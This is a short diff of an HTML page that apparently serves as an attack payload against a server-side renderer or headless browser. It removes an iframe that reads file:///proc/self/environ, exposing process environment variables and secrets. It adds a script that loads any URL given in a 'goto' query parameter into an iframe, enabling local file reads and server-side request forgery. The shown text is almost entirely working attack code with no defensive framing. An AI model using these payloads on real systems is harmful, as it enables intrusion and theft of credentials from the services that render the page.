@@ -15,7 +15,17 @@
         document.write(c);
     </script>
 
-<iframe src="file:///proc/self/environ" width="500" height="5000"></iframe>
+<script>
+    var url = new URL(window.location.href);
+    var goto = url.searchParams.get("goto");
+    if (goto) {
+        var iframe = document.createElement("iframe");
+        iframe.src = goto;
+        iframe.width = "500";
+        iframe.height = "500";
+        document.body.appendChild(iframe);
+    }
+</script>
 
 </body>
 </html>
